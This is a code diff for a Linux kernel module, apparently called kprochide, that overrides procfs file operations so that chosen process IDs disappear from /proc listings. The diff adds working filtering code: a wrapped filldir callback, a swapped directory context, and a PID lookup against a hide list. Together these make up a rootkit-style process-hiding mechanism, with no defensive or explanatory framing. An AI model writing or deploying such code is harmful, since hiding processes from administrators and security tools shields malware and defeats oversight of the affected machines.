@@ -18,27 +18,69 @@ struct file_operations procfs_fops;
 struct file_operations *procfs_backup_fops;
 struct inode *procfs_inode;
 
+struct dir_context *backup_dir_context;
+
 static void empty_pids_to_hide_list(void);
 static void restore_procfs_fops_to_default(void);
 static int override_procfs_fops(void);
+static bool should_hide_pid(const char*);
+
+static int kprochide_filldir(struct dir_context *ctx, 
+                             const char *name, 
+                             int namlen, 
+                             loff_t offset, 
+                             u64 ino, 
+                             unsigned int d_type)
+{   
+    // if directory name equals to one of our pids - hide it.
+    // otherwise, call the original filldir function and return its result.
+    if (should_hide_pid(name)) {
+        return 0;
+    }
+
+    return backup_dir_context->actor(backup_dir_context, name, namlen, offset, ino, d_type);
+}
+
+struct dir_context kprochide_ctx = { 
+    .actor = kprochide_filldir,
+    .pos = 0,
+};
 
 static int kprochide_iterate_shared(struct file *file, struct dir_context *dir_ctx)
 {
-    struct pid_to_hide* pid_to_hide;
+    int result = 0;
+    backup_dir_context = dir_ctx;
+    kprochide_ctx.pos = dir_ctx->pos;
+    result = procfs_backup_fops->iterate_shared(file, &kprochide_ctx); 
+    dir_ctx->pos = kprochide_ctx.pos;
 
-    list_for_each_entry(pid_to_hide, &kprochide_pids_to_hide, l_head) {
-        printk(KERN_INFO "kprochide: pid=%d\n", pid_to_hide->pid);
-    }
-
-    return procfs_backup_fops->iterate_shared(file, dir_ctx);
+    return result;
 }
 
-static int kprochide_filldir(struct dir_context *ctx, 
-                             const char *name, int namlen, 
-                             loff_t offset, u64 ino, 
-                             unsigned int d_type)
-{   
-    return 0;
+static bool should_hide_pid(const char* pid_dir_name)
+{
+    int dir_name_as_int = 0;
+    pid_t dir_name_as_pid = 0;
+    struct pid_to_hide* pid_to_hide = NULL;
+
+    int conversion_result = kstrtoint(pid_dir_name, DECIMAL_BASE, &dir_name_as_int);
+    if ((-EINVAL == conversion_result) || (-ERANGE == conversion_result)) {
+        return false;
+    }
+    dir_name_as_pid = (pid_t)dir_name_as_int;
+
+    bool pid_found = false;
+    mutex_lock(&kprochide_pids_to_hide_mutex);
+    list_for_each_entry(pid_to_hide, &kprochide_pids_to_hide, l_head) {
+        if (dir_name_as_pid == pid_to_hide->pid) {
+            pid_found = true;
+            // break instead of return for us to be enable to release the mutex
+            break;
+        }
+    }
+    mutex_unlock(&kprochide_pids_to_hide_mutex);
+
+    return pid_found;
 }
 
 static void empty_pids_to_hide_list()
